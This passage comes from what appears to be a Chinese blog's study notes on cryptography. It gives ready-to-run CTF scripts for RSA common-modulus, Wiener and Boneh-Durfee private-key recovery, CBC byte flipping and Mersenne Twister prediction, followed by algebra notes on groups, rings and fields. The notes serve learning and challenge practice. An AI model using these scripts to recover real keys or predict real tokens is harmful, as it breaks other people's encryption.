display">\[\begin{cases}m^{e_1s_1}\equiv c_1^{s_1}(mod\ n) \\ m^{e_2s_2}\equivc_2^{s_2}(mod\ n)\end{cases}\]</span> 两式相乘 <span class="math display">\[m^{e_1s_1+e_2s_2}\equiv c_1^{s_1}c_2^{s_2}(mod\ n)\]</span>这里使用扩展欧几里得算法，我们可以找到能满足e1s1+e2s2=1的s1和s2。又因为一般来说m&lt;n，所以<span class="math display">\[m=c_1^{s_1}c_2^{s_2}\ mod\ n\]</span> 代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=</span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">_gcd,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n)%n</span><br></pre></td></tr></table></figure><h2 id="维纳攻击">维纳攻击</h2><p>参考<ahref="https://blog.csdn.net/XiongSiqi_blog/article/details/130515028">这篇文章</a></p><p>用于RSA中e很大的时候</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">n=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">d=wienerAttack(e, n)</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure><h2 id="boneh-durfee攻击">Boneh Durfee攻击</h2><p>类似维纳攻击，但可使d范围更大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">debug = True</span><br><span class="line">strict = False</span><br><span class="line">helpful_only = True</span><br><span class="line">dimension_min = 7</span><br><span class="line">def helpful_vectors(BB, modulus):</span><br><span class="line">    nothelpful = 0</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        if BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += 1</span><br><span class="line"> </span><br><span class="line">    print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)</span><br><span class="line">def matrix_overview(BB, bound):</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        a = (&#x27;%02d &#x27; % ii)</span><br><span class="line">        for jj in range(BB.dimensions()[1]):</span><br><span class="line">            a += &#x27;0&#x27; if BB[ii,jj] == 0 else &#x27;X&#x27;</span><br><span class="line">            if BB.dimensions()[0] &lt; 60:</span><br><span class="line">                a += &#x27; &#x27;</span><br><span class="line">        if BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += &#x27;~&#x27;</span><br><span class="line">        print (a)</span><br><span class="line">def remove_unhelpful(BB, monomials, bound, current):</span><br><span class="line">    if current == -1 or BB.dimensions()[0] &lt;= dimension_min:</span><br><span class="line">        return BB</span><br><span class="line">    for ii in range(current, -1, -1):</span><br><span class="line">        if BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = 0</span><br><span class="line">            affected_vector_index = 0</span><br><span class="line">            for jj in range(ii + 1, BB.dimensions()[0]):</span><br><span class="line">                if BB[jj, ii] != 0:</span><br><span class="line">                    affected_vectors += 1</span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line">            if affected_vectors == 0:</span><br><span class="line">                print (&quot;* removing unhelpful vector&quot;, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                return BB</span><br><span class="line">            elif affected_vectors == 1:</span><br><span class="line">                affected_deeper = True</span><br><span class="line">                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):</span><br><span class="line">                    if BB[kk, affected_vector_index] != 0:</span><br><span class="line">                        affected_deeper = False</span><br><span class="line">                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                    return BB</span><br><span class="line">    return BB</span><br><span class="line">def boneh_durfee(pol, modulus, mm, tt, XX, YY):</span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + 1 - u) # u = xy + 1</span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line">    UU = XX*YY + 1</span><br><span class="line">    gg = []</span><br><span class="line">    for kk in range(mm + 1):</span><br><span class="line">        for ii in range(mm - kk + 1):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line">    monomials = []</span><br><span class="line">    for polynomial in gg:</span><br><span class="line">        for monomial in polynomial.monomials():</span><br><span class="line">            if monomial not in monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm/tt) * jj, mm + 1):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift)</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm/tt) * jj, mm + 1):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    for ii in range(nn):</span><br><span class="line">        BB[ii, 0] = gg[ii](0, 0, 0)</span><br><span class="line">        for jj in range(1, ii + 1):</span><br><span class="line">            if monomials[jj] in gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line">    if helpful_only:</span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)</span><br><span class="line">        nn = BB.dimensions()[0]</span><br><span class="line">        if nn == 0:</span><br><span class="line">            print (&quot;failure&quot;)</span><br><span class="line">            return 0,0</span><br><span class="line">    if debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    if det &gt;= bound:</span><br><span class="line">        print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;)</span><br><span class="line">        print (&quot;Try with highers m and t.&quot;)</span><br><span class="line">        if debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(2)</span><br><span class="line">            print (&quot;size det(L) - size e^(m*n) = &quot;, floor(diff))</span><br><span class="line">        if strict:</span><br><span class="line">            return -1, -1</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;)</span><br><span class="line">    if debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;)</span><br><span class="line">    BB = BB.LLL()</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;LLL is done!&quot;)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;looking for independent vectors in the lattice&quot;)</span><br><span class="line">    found_polynomials = False</span><br><span class="line">    for pol1_idx in range(nn - 1):</span><br><span class="line">        for pol2_idx in range(pol1_idx + 1, nn):</span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = 0</span><br><span class="line">            for jj in range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line">            if rr.is_zero() or rr.monomials() == [1]:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx)</span><br><span class="line">                found_polynomials = True</span><br><span class="line">                break</span><br><span class="line">        if found_polynomials:</span><br><span class="line">            break</span><br><span class="line">    if not found_polynomials:</span><br><span class="line">        print (&quot;no independant vectors could be found. This should very rarely happen...&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line">    rr = rr(q, q)</span><br><span class="line">    soly = rr.roots()</span><br><span class="line">    if len(soly) == 0:</span><br><span class="line">        print (&quot;Your prediction (delta) is too small&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line">    soly = soly[0][0]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[0][0]</span><br><span class="line">    return solx, soly</span><br><span class="line">def example(N,e,delta):</span><br><span class="line">    t = int((1-2*delta) * m)</span><br><span class="line">    X = 2*floor(N^delta)</span><br><span class="line">    Y = floor(N^(1/2))</span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+1)/2)</span><br><span class="line">    pol = 1 + x * (A + y)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;=== checking values ===&quot;)</span><br><span class="line">        print (&quot;* delta:&quot;, delta)</span><br><span class="line">        print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span><br><span class="line">        print (&quot;* size of e:&quot;, int(log(e)/log(2)))</span><br><span class="line">        print (&quot;* size of N:&quot;, int(log(N)/log(2)))</span><br><span class="line">        print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;=== running algorithm ===&quot;)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"> </span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line">    if solx &gt; 0:</span><br><span class="line">        print (&quot;=== solution found ===&quot;)</span><br><span class="line">        if False:</span><br><span class="line">            print (&quot;x:&quot;, solx)</span><br><span class="line">            print (&quot;y:&quot;, soly)</span><br><span class="line"> </span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        print (&quot;private key found:&quot;, d)</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;=== no solution was found ===&quot;)</span><br><span class="line"> </span><br><span class="line">    if debug:</span><br><span class="line">        print(&quot;=== %s seconds ===&quot; % (time.time() - start_time))</span><br><span class="line">    return d</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    c =</span><br><span class="line">    n =</span><br><span class="line">    e =</span><br><span class="line">    delta = 0.28 # this means that d &lt; N^delta</span><br><span class="line">    d = example(n,e,delta)</span><br><span class="line">    print(long_to_bytes(int(pow(c,d,n))))</span><br></pre></td></tr></table></figure><h2 id="cbc字节翻转攻击">CBC字节翻转攻击</h2><p>参考<ahref="https://blog.csdn.net/xiongsiqi_blog/article/details/131925246">这篇文章</a></p><p>用于CBC模式下的AES加密</p><p>个人认为上面的文章中这一段讲得已经很清楚了</p><figure><img src="/images/密码学算法散记/image-20240721165239569.png"alt="image-20240721165239569" /><figcaption aria-hidden="true">image-20240721165239569</figcaption></figure><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a1, a2</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1,b2 <span class="keyword">in</span> <span class="built_in">zip</span>(a1,a2)])</span><br><span class="line">A=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">C=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">CC=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">AA=strxor(A,C)</span><br><span class="line">AA=strxor(AA,CC)</span><br><span class="line"><span class="built_in">print</span>(AA)</span><br></pre></td></tr></table></figure><h2 id="mt19937伪随机数预测">MT19937伪随机数预测</h2><p>MT19937，即梅森旋转算法，是一种伪随机数的生成算法，python中的random模块生成“随机数”时使用的就是这种算法。</p><p>根据其原理，有一个叫randcrack的python模块可以对其生成的“随机数”进行预测，前提是需要已知已经生成的至少624个32位二进制数，这样才能预测出下一个生成的数会是多少。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand=[] <span class="comment">#624个32位二进制数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(Rand[i])</span><br><span class="line">pre=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(pre)</span><br></pre></td></tr></table></figure><p>那么前面给出的是312个64位数呢？</p><p>其实，random生成64位数的方式就是先生成2个32位数，然后将它们拼起来得到的。因此我们只需要把这个64位数拆开成两个32位数即可。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand= [] <span class="comment">#312个64位数</span></span><br><span class="line">prng=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Rand:</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&amp; (<span class="number">2</span> ** <span class="number">32</span> - <span class="number">1</span>))</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&gt;&gt; <span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(prng[i])</span><br><span class="line">notrandom=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(notrandom)</span><br></pre></td></tr></table></figure><h2 id="lcg">LCG</h2><p>参考<ahref="https://blog.csdn.net/weixin_45883223/article/details/115299389">这篇文章</a>和<ahref="https://blog.csdn.net/superprintf/article/details/108964563">这篇文章</a></p><p>LCG，线性同余法，是一种生成伪随机数的方法，用一个公式来概括就是 <spanclass="math display">\[X_{n+1}=(aX_n+b)\ mod\ m\]</span> 基本围绕以下四个公式，即可解决各类基础的LCG问题</p><figure><imgsrc="/images/密码学算法散记/c00bad18-4f1e-4719-81d0-526a8db7030c.png"alt="c00bad18-4f1e-4719-81d0-526a8db7030c" /><figcaptionaria-hidden="true">c00bad18-4f1e-4719-81d0-526a8db7030c</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础散记</title>
      <link href="/posts/456e3691/"/>
      <url>/posts/456e3691/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些遇到的密码学相关知识<del>（当裁缝）</del></p></blockquote><h2 id="威尔逊定理">威尔逊定理</h2><p>任一素数减去1的阶乘与-1模该素数同余。即对于任何素数p，都有 <spanclass="math display">\[(p-1)!+1\equiv 0(mod\ p)\]</span></p><h3 id="引理">引理</h3><p>设p是素数，f(x)是整系数多项式，再设a1,a2,...,an两两对模不同余，满足<span class="math display">\[f(a_j)\equiv 0(mod\ p),1\leq j\leq n\]</span> 则存在整系数多项式q(x)，使得 <span class="math display">\[f(x)\equiv q(x)(x-a_1)(x-a_2)...(x-a_n)(mod\ p)\]</span> 由此可进一步推知， <span class="math display">\[x^{p-1}-1\equiv (x-1)...(x-p+1)(mod\ p)\]</span></p><h2 id="群论">群论</h2><p>参考了百度百科和<ahref="https://blog.csdn.net/chenxy_bwave/article/details/122702319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170972835316800226592151%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170972835316800226592151&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-122702319-null-null.142%5Ev99%5Epc_search_result_base7&amp;utm_term=%E7%BE%A4%E8%AE%BA&amp;spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="二元运算">二元运算</h3><figure><img src="/images/密码学散记/image-20240306205145595.png"alt="image-20240306205145595" /><figcaption aria-hidden="true">image-20240306205145595</figcaption></figure><h3 id="定义">定义</h3><figure><img src="/images/密码学散记/image-20240306205505241.png"alt="image-20240306205505241" /><figcaption aria-hidden="true">image-20240306205505241</figcaption></figure><h3 id="循环群">循环群</h3><figure><img src="/images/密码学散记/image-20240306210708812.png"alt="image-20240306210708812" /><figcaption aria-hidden="true">image-20240306210708812</figcaption></figure><h3 id="阿贝尔群">阿贝尔群</h3><p>若一个群满足交换律，则称其为阿贝尔群，也称为交换群。</p><h3 id="同态">同态</h3><p>设(M,<em>)和(S,·)是两个群，σ:M→S，∀a,b∈M，有σ(a</em>b)=σ(a)·σ(b)，则称σ为M到S的同态或群映射。</p><p>也就是说，先运算再映射和先映射再运算得到的结果相等。</p><p>如果为单射，则称为单同态。</p><h3 id="同构">同构</h3><p>如果一个同态映射可逆（双射），则称这两个群同构。</p><h3 id="半群">半群</h3><p>只满足定义中的1、2两条</p><h2 id="离散对数">离散对数</h2><p>当模m有原根时，设l为模m的一个原根，则当x=l^k mod m时， <spanclass="math display">\[Ind_lx\equiv k(mod\ \phi(m))\]</span> 离散对数和一般的对数有着相类似的性质： <spanclass="math display">\[Ind_lxy\equiv Ind_lx+Ind_ly(mod\ \phi(m))\]</span></p><p><span class="math display">\[Ind_lx^y\equiv yInd_lx(mod\ \phi(m))\]</span></p><p>在程序中，我们可以用sympy库中的discrete_log函数来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">x=</span><br><span class="line">y=</span><br><span class="line">z=</span><br><span class="line">e=sympy.discrete_log(x,y,z)  <span class="comment">##求e，discrete_log(x,y,z)，x为模，y为余数，z为底数 </span></span><br></pre></td></tr></table></figure><h2 id="环和域">环和域</h2><p>需要结合上面说到的群论来看，参考了这篇文章](https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170980296016800184186780&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>all</sub>top_click~default-1-129884474-null-null.142<sup>v99</sup>pc_search_result_base7&amp;utm_term=%E7%8E%AF&amp;spm=1018.2226.3001.4187)</p><h3 id="定义-1">定义</h3><figure><img src="/images/密码学基础散记/image-20240307204549987.png"alt="image-20240307204549987" /><figcaption aria-hidden="true">image-20240307204549987</figcaption></figure><h3 id="交换环-含幺环-交换含幺环">交换环 含幺环 交换含幺环</h3><figure><img src="/images/密码学基础散记/image-20240307204829672.png"alt="image-20240307204829672" /><figcaption aria-hidden="true">image-20240307204829672</figcaption></figure><h3 id="性质">性质</h3><figure><img src="/images/密码学基础散记/image-20240307205000778.png"alt="image-20240307205000778" /><figcaption aria-hidden="true">image-20240307205000778</figcaption></figure><h3 id="无零因子环和含零因子环">无零因子环和含零因子环</h3><figure><img src="/images/密码学基础散记/image-20240307205056700.png"alt="image-20240307205056700" /><figcaption aria-hidden="true">image-20240307205056700</figcaption></figure><figure><img src="/images/密码学基础散记/image-20240307205356769.png"alt="image-20240307205356769" /><figcaption aria-hidden="true">image-20240307205356769</figcaption></figure><p>在有限含幺环中，无零因子等同于(非零元)有逆元。</p><h3 id="整环整区">整环（整区）</h3><p>交换含幺的无零因子环称为整环。</p><h3 id="除环">除环</h3><figure><img src="/images/密码学基础散记/image-20240307205340140.png"alt="image-20240307205340140" /><figcaption aria-hidden="true">image-20240307205340140</figcaption></figure><p>除环是含幺的无零因子环。</p><h2 id="域">域</h2><p>接上面的环，参考了百度百科和<ahref="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170980296016800184186780&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&amp;utm_term=%E7%8E%AF&amp;spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="定义-2">定义</h3><figure><img src="/images/密码学基础散记/image-20240307205839086.png"alt="image-20240307205839086" /><figcaption aria-hidden="true">image-20240307205839086</figcaption></figure><p>可以说，可交换的除环是域，或有限整环是域</p><p>百度百科上的描述也不错</p><figure><img src="/images/密码学基础散记/image-20240307211359034.png"alt="image-20240307211359034" /><figcaption aria-hidden="true">image-20240307211359034</figcaption></figure><h3 